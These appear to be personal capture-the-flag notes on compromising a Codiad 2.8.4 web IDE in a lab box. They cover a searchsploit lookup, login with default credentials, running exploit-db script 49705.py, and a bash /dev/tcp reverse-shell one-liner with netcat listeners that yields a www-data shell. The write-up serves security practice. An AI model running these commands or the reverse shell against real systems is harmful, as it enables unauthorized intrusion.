```
searchsploit codiad 2.8.4 
```


```      
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Codiad 2.8.4 - Remote Code Execution (Authenticated)                                                                       | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)                                                                   | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)                                                                   | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)                                                                   | multiple/webapps/50474.txt
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

need to be authenticated, after reviewing the message from the ftp server, we need to find the default password for the web service codiad

found this default password

https://attackdefense.com/challengedetailsnoauth?cid=312

trying the credentials to login

```
john
password
```

success

![[codiad.png]]

https://www.exploit-db.com/exploits/49705

```
python 49705.py http://10.10.239.154:62337/ john password 10.6.24.127 1337 linux
```

after some trial and error, I noticed you need to have two listeners going at once

so run the python script with the arguments as seen 


```
python 49705.py http://10.10.239.154:62337/ john password 10.6.24.127 1337 linux
```

then the exploit script dictates to run the following command

```
echo 'bash -c "bash -i >/dev/tcp/10.6.24.127/1338 0>&1 2>&1"' | nc -lnvp 1337
```

it also specifies to run an additional command in another terminal

```
nc -lnvp 1338
```

this is what it looks like when ran successfully

![[webrevshells1.png]]

![[webrevshells2.png]]

![[webrevshells3.png]]


we get a successful reverse shell

```
www-data@ide:/var/www/html/codiad/components/filemanager$ whoami
whoami
www-data
www-data@ide:/var/www/html/codiad/components/filemanager$ uname -a
uname -a
Linux ide 4.15.0-147-generic #151-Ubuntu SMP Fri Jun 18 19:21:19 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
www-data@ide:/var/www/html/codiad/components/filemanager$
```
